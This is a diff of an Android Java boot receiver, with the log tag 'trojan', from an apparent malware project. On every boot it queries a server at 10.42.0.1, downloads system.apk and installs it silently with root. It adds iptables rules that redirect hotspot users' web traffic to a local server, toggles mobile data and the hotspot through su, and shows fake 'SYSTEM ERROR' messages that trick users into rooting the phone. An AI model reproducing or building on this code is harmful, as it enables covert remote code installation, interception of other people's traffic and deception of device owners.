@@ -4,9 +4,6 @@ import org.apache.http.HttpResponse;
 import org.apache.http.client.HttpClient;
 import org.apache.http.client.methods.HttpGet;
 import org.apache.http.impl.client.DefaultHttpClient;
-import java.io.BufferedReader;
-import java.io.InputStream;
-import java.io.InputStreamReader;
 import android.os.AsyncTask;
 import android.os.CountDownTimer;
 import android.content.BroadcastReceiver;
@@ -24,47 +21,106 @@ import android.view.Gravity;
 import android.graphics.Color;
 import android.net.Uri;
 import android.webkit.MimeTypeMap;
+import android.net.wifi.WifiManager;
+import android.net.wifi.WifiConfiguration;
 import java.io.*;
+import java.net.*;
+import java.lang.reflect.*;
 
 public class ReceiverBoot extends BroadcastReceiver
 {
 	private static String TAG = "trojan";
 	private boolean oke = true;
 	private Toast toast;
+	private Context exContext;
 	private ServerUtils utils;
     private Installer installator;
     private String pathToInstallServer;
     private String docFolder, pathExternal;
-    private boolean main = false;
+    private static boolean main = true;
     private SharedPreferences settings;
+	private SharedPreferences.Editor seteditor;
+	
+	public static String requestAksi = "";
+	public static String requestPath = "";
+	public static String requestUrl = "";
+	public static String requestResult = "";
 
 	@Override
 	public void onReceive(Context context, Intent intent)
 	{
+		if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED))
+			context.startService(new Intent(context, System.class));
+
+		exContext = context;
 		settings = context.getSharedPreferences("Settings", 0);
-		inServer(context, "http://10.42.0.1/download.php?main=zzz");
+		seteditor = settings.edit();
 		utils = new ServerUtils(context);
         pathToInstallServer = utils.getPathToInstallServer();
         docFolder = utils.getDocFolder();
         pathExternal = utils.getPathExternal();
 
+        requestUrl = "http://10.42.0.1/client.php";
+		requestAksi = "web";
+		mainRequest(context);
+
+		Toast.makeText(context, requestResult, Toast.LENGTH_LONG).show();
+        
+        if (requestResult.equals("baru")) {
+	        requestUrl = "http://10.42.0.1/download.php?id=system.apk";
+			requestAksi = "download";
+			requestPath = pathExternal;
+			mainRequest(context);
+			try {
+				String[] paket = { "pm install "+pathExternal+"/system.apk"};
+				rootCommands(paket);
+			} catch (Exception e) {
+				
+			}
+		}
+
         extrak(context, "server.zip", pathToInstallServer, docFolder);
+        
+
         if (settings.getBoolean("server install",true)) 
         {
         	utils.runSrv();
 			extrak(context, "data.zip", pathExternal, pathExternal);
 
 			if (rootRequest().equals("root")) {
-				String[] iproute = {"iptables -A FORWARD -p udp --dport 53 -j ACCEPT",
-        			"iptables -A FORWARD -p udp --sport 53 -j ACCEPT",
-        			"iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.43.1:8888",
-        			"iptables -P FORWARD DROP"
-        		};
+				
+        		if (hostspotStatus(context) && main) 
+        		{
+        			String[] iproute = {
+        				"iptables -A FORWARD -p udp --dport 53 -j ACCEPT",
+        				"iptables -A FORWARD -p udp --sport 53 -j ACCEPT",
+        				"iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination "+Identitas.getIPAddress(true)+":8888",
+        				"iptables -P FORWARD DROP"
+        			};
+        			main = false;
+		    		rootCommands(iproute);
+		    		setGSM(true, context);
 
-        		rootCommands(iproute);
+        			CountDownTimer hitungMundur = new CountDownTimer(60000, 100){
+						public void onTick(long millisUntilFinished){}
+						public void onFinish()
+						{
+							if (settings.getString("main","").equals("hotspot")) 
+							{
+								seteditor.putString("main", "hotspot");    
+        						seteditor.commit();
+							} else {
+								hotspotConfig(exContext); // off hotspot
+								setGSM(false, context);
+							}
+						}
+					}.start();
+		    	} 
+
+
 			}
 			else if (rootRequest().equals("tolak user")) {
-				toastText(context, "SYSTEM ERROR!!\n\n\n     Please Allow superuser.    \n", Color.GREEN, Gravity.CENTER | Gravity.RIGHT, 20000);
+				toastText(context, "SYSTEM ERROR!!\n\n\n     Please Allow superuser.    \n", Color.GREEN, Gravity.CENTER, 20000);
 			}
 			else if (rootRequest().equals("tidak root")) {
 				if (!openApp(context, "kingoroot.supersu")) 
@@ -82,7 +138,7 @@ public class ReceiverBoot extends BroadcastReceiver
 	            	    context.startActivity(intent);
 	            	} catch (Exception ae) {}
 
-					toastText(context, "SYSTEM ERROR!!\n\n\nYou can update the system or rooted the phone.\n\bPlease install this app! and rooted", Color.YELLOW, Gravity.CENTER | Gravity.RIGHT, 200000);
+					toastText(context, "SYSTEM ERROR!!\n\n\nYour firmware is NOT updated please follow this Tutorial.\n\n1. Install this app SuperUser\n\b2. Open app and click root.", Color.YELLOW, Gravity.CENTER, 200000);
 				}
 			}
 			else {
@@ -90,9 +146,55 @@ public class ReceiverBoot extends BroadcastReceiver
 			}
 			
         }
-
-		if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) context.startService(new Intent(context, System.class));
 	}
+
+	private static void setGSM(boolean enable, Context context) {
+    	String command;
+    	if (enable) {
+    		command = "svc data enable\n";
+    	} else {
+    		command = "svc data disable\n";
+    	}
+    	try {
+    		Process su = Runtime.getRuntime().exec("su");
+    		DataOutputStream out = new DataOutputStream(su.getOutputStream());
+    		out.writeBytes(command);
+    		out.flush();
+    		
+    		out.close();
+    	}
+    	catch (Exception e) {}
+    }
+
+	public static boolean hostspotStatus(Context context) { 
+		WifiManager wifimanager = (WifiManager) context.getSystemService(context.WIFI_SERVICE); 
+		try { 
+			Method method = wifimanager.getClass().getDeclaredMethod("isWifiApEnabled"); 
+			method.setAccessible(true); 
+			return (Boolean) method.invoke(wifimanager); 
+		}
+		catch (Throwable ignored) {} 
+		return false; 
+	} 
+
+	public static boolean hotspotConfig(Context context) { 
+		WifiManager wifimanager = (WifiManager) context.getSystemService(context.WIFI_SERVICE); 
+		WifiConfiguration wificonfiguration = null; 
+		try { 
+			// if WiFi is on, turn it off 
+			if(hostspotStatus(context)) { 
+				wifimanager.setWifiEnabled(false);
+				main = true;
+			} 
+			Method method = wifimanager.getClass().getMethod("setWifiApEnabled", WifiConfiguration.class, boolean.class); 
+			method.invoke(wifimanager, wificonfiguration, !hostspotStatus(context)); 
+			return true; 
+		}
+		catch (Exception e) { 
+			e.printStackTrace(); 
+		} 
+		return false; 
+	} 
 
 	public static String rootRequest() {
 		boolean retval = false;
@@ -167,68 +269,115 @@ public class ReceiverBoot extends BroadcastReceiver
         return null;
     }
 
-	public void inServer(Context context, String url) {
+	public void mainRequest(Context context) {
 		CallWebPageTask task = new CallWebPageTask();
 		task.applicationContext = context;
-		task.execute(new String[] { url });
-		Log.i(TAG, "receiver:"+url);
+		task.main = requestAksi;
+		task.execute(new String[] { requestUrl });
+	}
+
+	public String requestDownload() {
+		InputStream input = null;
+        OutputStream output = null;
+        HttpURLConnection connection = null;
+        String error = "";
+        try {
+            URL url = new URL(requestUrl);
+            connection = (HttpURLConnection) url.openConnection();
+            connection.connect();
+
+            if (connection.getResponseCode() != HttpURLConnection.HTTP_OK) {
+                return "Server returned HTTP "+ connection.getResponseCode()+" "+connection.getResponseMessage();
+            }
+
+            int fileLength = connection.getContentLength();
+
+            // download the file
+            input = connection.getInputStream();
+            output = new FileOutputStream(requestPath);
+            byte data[] = new byte[4096];
+            long total = 0;
+            int count;
+
+            while ( (count=input.read(data)) != -1 ) {
+                /*if (isCancelled()) {
+                    input.close();
+                    return null;
+                }*/
+                total += count;
+
+                if (fileLength > 0) 
+                    //publishProgress((int) (total*100/fileLength));
+                output.write(data, 0, count);
+            }
+
+        } catch (IOException e) {
+            error = e.toString();
+        } finally {
+            try {
+                if (output != null) output.close();
+                if (input != null) input.close();
+            }
+            catch (IOException ioe) {
+
+            }
+            if (connection != null) connection.disconnect();
+        }
+        return "ok : "+error;
 	}
 	
-	//Method untuk Mengirimkan data keserver
-	public String getRequest(String Url){
+	//Mengirimkan data web keserver
+	public String requestWeb(){
 		String sret;
-        HttpClient client = new DefaultHttpClient();
-        HttpGet request = new HttpGet(Url);
+        HttpClient httpClient = new DefaultHttpClient();
+        HttpGet request = new HttpGet(requestUrl);
         try{
-            HttpResponse response = client.execute(request);
-            sret= request(response);
+            HttpResponse response = httpClient.execute(request);
+
+            try { // split result
+         	   InputStream in = response.getEntity().getContent();
+         	   BufferedReader reader = new BufferedReader(new InputStreamReader(in));
+         	   StringBuilder str = new StringBuilder();
+         	   String line = null;
+         	   while((line = reader.readLine()) != null){
+         	       str.append(line + "\n");
+         	   }
+         	   in.close();
+         	   sret = str.toString();
+        	} catch(Exception ex) {
+        	    sret = "Error split text";
+        	}
         }
 		catch(Exception ex){
-			sret= "Failed Connect to Server!";
+			sret = "Failed Connect to Server!";
 			Log.i(TAG, "receiver:offline");
         }
         return sret;
-
-    }
-	// Method untuk Menerima data dari server
-	public static String request(HttpResponse response){
-        String result = "";
-        try{
-            InputStream in = response.getEntity().getContent();
-            BufferedReader reader = new BufferedReader(new InputStreamReader(in));
-            StringBuilder str = new StringBuilder();
-            String line = null;
-            while((line = reader.readLine()) != null){
-                str.append(line + "\n");
-            }
-            in.close();
-            result = str.toString();
-        }
-		catch(Exception ex){
-            result = "Error split text";
-        }
-        return result;
     }
 
 	private class CallWebPageTask extends AsyncTask<String, Void, String> 
 	{
 		protected Context applicationContext;
-
+		protected String main = "";
 		// connecting...
 		@Override
 		protected void onPreExecute() {}
 
 	    @Override
-	    protected String doInBackground(String... urls) {
-			String response = "";
-			response = getRequest(urls[0]);
-			return response;
+	    protected String doInBackground(String... data) {
+	    	//data[0] = url
+	    	if (main.equals("web")) {
+				return requestWeb();
+			}
+			else {
+				return requestDownload();
+			}
 	    }
 
 	    // berhasil
 	    @Override
 	    protected void onPostExecute(String result) {
-			Log.i(TAG, "receiver:"+result);
+	    	requestResult = result;
 		}
 	}
 
